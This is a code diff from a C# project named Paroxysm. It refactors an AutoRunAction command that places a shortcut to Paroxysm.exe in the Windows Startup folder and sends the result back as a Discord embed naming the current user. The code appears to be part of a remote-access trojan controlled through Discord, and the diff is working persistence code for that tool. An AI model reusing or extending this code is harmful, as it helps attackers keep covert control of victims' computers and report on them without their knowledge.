@@ -1,11 +1,12 @@
-﻿using IWshRuntimeLibrary;
-using Paroxysm.Debug;
+﻿using Discord;
+using IWshRuntimeLibrary;
+using Paroxysm.Tools;
 
 namespace Paroxysm.Hooks.Actions;
 
 public static class AutoRunAction
 {
-    public static void Follow()
+    public static Embed Follow()
     {
         var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
         var appPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Paroxysm.exe");
@@ -21,17 +22,19 @@ public static class AutoRunAction
             }
 
             WshShell shell = new();
-            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
+            var shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
             shortcut.TargetPath = appPath;
             shortcut.Save();
 
-            Logger.CreateEmbed(ELoggerState.Error, new Exception(startupFolderPath));
-
-            Logger.CreateEmbed(ELoggerState.Error, new Exception("Aplikacja została dodana do autostartu."));
+            return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed",
+                "Application has been added to startup.", Environment.UserName, null);
         }
-        catch (Exception ex)
+        catch (Exception exception)
         {
-            Logger.CreateEmbed(ELoggerState.Error, ex);
+            Logger.ThrowEmbedError(exception);
         }
+
+        return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+            "Cannot add application to startup.", Environment.UserName, null);
     }
 }
